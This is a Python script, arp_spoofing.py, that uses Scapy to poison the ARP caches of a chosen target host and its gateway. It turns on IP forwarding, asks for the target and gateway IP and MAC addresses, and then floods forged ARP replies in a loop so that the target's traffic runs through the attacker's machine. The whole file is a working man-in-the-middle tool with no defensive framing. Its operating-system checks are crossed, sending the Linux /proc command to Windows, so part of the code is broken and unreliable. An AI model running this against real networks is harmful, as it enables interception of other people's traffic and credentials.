# 
# coding:utf-8
# arp_spoofing.py
#
from scapy.all import *
import sys
import subprocess
import os

print("[*] Enabling IP Forwarding...\n")
if os.name == 'nt':
    command = ["echo 1 > /proc/sys/net/ipv4/ip_forward"]
    subprocess.call(command,shell=True)
elif os.name == 'posix':
    command = ["sysctl -w net.inet.ip.forwarding = 1"]
    subprocess.call(command,shell=True)
else:
    print("error")
    sys.exit()

conf.verb = 0 
target_ip     = input("target_ip e.g. 191.1.1.45 >> ")
target_mac    = input("target_mac e.g. e6:6e:47:a4:bb:76 >> ")
gateway_ip    = input("gateway_ip e.g. 191.1.1.1 >> ")
gateway_mac   = input("gateway_mac e.g. d6:6e:44:f4:73:76 >> ")
fake_mac_addr = input("fake_mac_addr e.g. d8:6e:34:e4:23:67 >> ")

def main():
    try:
        print("[*] Start ARP_spoofing...[CTRL-C to stop]")
        poison_target(target_ip,target_mac,gateway_ip,gateway_mac)
    except KeyboardInterrupt:
        pass
    finally:
        restore_table(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)

def poison_target(target_ip,target_mac,gateway_ip,gateway_mac):
    # ARP
    poisoning_target       = Ether(dst=target_mac)/ARP()
    poisoning_target.op    = 2                # ARP
    poisoning_target.psrc  = gateway_ip       
    poisoning_target.pdst  = target_ip        

    poisoning_gateway      = Ether(dst=gateway_mac)/ARP()
    poisoning_gateway.op   = 2                # ARP
    poisoning_gateway.psrc = target_ip
    poisoning_gateway.pdst = gateway_ip
    # MAC
    frame = Ether(dst = target_mac)/ARP(op=2,hwsrc = fake_mac_addr,hwdst = target_mac)

    while True:
        sendp(poisoning_target)
        sendp(poisoning_gateway)
        sendp(frame)
    print("[*] Finished.")
    return

def restore_table(gateway_ip,gateway_mac,target_ip,target_mac):
    print("[*] Restoring target.")
    arp       = ARP()
    arp.op    = 1                
    arp.psrc  = gateway_ip        
    arp.hwsrc = gateway_mac      
    arp.pdst  = target_ip        
    arp.hwdst = target_mac       
    send(arp, count = 3)
    
    print("Disabling IP Forwading...\n")
    if os.name == 'nt':
        command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
        subprocess.call(command,shell=True)
    elif os.name == 'posix':
        command = "sysctl -w net.inet.ip.forwarding = 0"
        subprocess.call(command,shell=True)

if __name__ == "__main__":
    main()